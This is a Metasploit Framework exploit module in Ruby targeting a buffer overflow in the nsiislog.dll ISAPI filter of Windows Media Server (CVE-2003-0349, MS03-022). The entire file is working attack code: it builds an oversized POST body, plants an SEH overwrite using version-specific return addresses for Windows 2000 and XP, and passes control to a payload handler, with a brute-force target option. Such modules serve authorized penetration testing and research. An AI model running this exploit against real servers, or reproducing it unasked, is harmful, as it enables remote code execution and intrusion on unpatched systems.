##
# $Id: ms03_022_nsiislog_post.rb 9929 2010-07-25 21:37:54Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::BruteTargets
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow',
			'Description'    => %q{
					This exploits a buffer overflow found in the nsiislog.dll
				ISAPI filter that comes with Windows Media Server. This
				module will also work against the 'patched' MS03-019
				version. This vulnerability was addressed by MS03-022.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9929 $',
			'References'     =>
				[
					[ 'CVE', '2003-0349'],
					[ 'OSVDB', '4535'],
					[ 'BID', '8035'],
					[ 'MSB', 'MS03-022'],
					[ 'URL', 'http://archives.neohapsis.com/archives/vulnwatch/2003-q2/0120.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",
					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# SEH offsets by version (Windows 2000)
					# 4.1.0.3917 =  9992
					# 4.1.0.3920 =  9992
					# 4.1.0.3927 =  9992
					# 4.1.0.3931 = 14092

					['Brute Force',            { }],
					['Windows 2000 -MS03-019', { 'Rets' => [  9988, 0x40f01333 ] }],
					['Windows 2000 +MS03-019', { 'Rets' => [ 14088, 0x40f01353 ] }],
					['Windows XP   -MS03-019', { 'Rets' => [  9992, 0x40f011e0 ] }],
				],
			'DisclosureDate' => 'Jun 25 2003',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URL', [ true,  "The path to nsiislog.dll", "/scripts/nsiislog.dll" ]),
			], self.class)
	end

	def check
		res = send_request_raw({
			'uri' => datastore['URL']
		}, -1)

		if (res and res.body =~ /NetShow ISAPI/)
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit_target(target)

		# Create a buffer greater than max SEH offset (16384)
		pst = rand_text_alphanumeric(256) * 64

		# Create SEH frame and insert into buffer
		seh = generate_seh_payload(target['Rets'][1])
		pst[target['Rets'][0], seh.length] = seh

		# Send it to the server
		print_status("Sending request...")
		res = send_request_cgi({
			'uri'          => datastore['URL'],
			'method'       => 'POST',
			'user-agent'   => 'NSPlayer/2.0',
			'content-type' => 'application/x-www-form-urlencoded',
			'data'         => pst
		}, 5)

		select(nil,nil,nil,1)

		handler
		disconnect
	end

end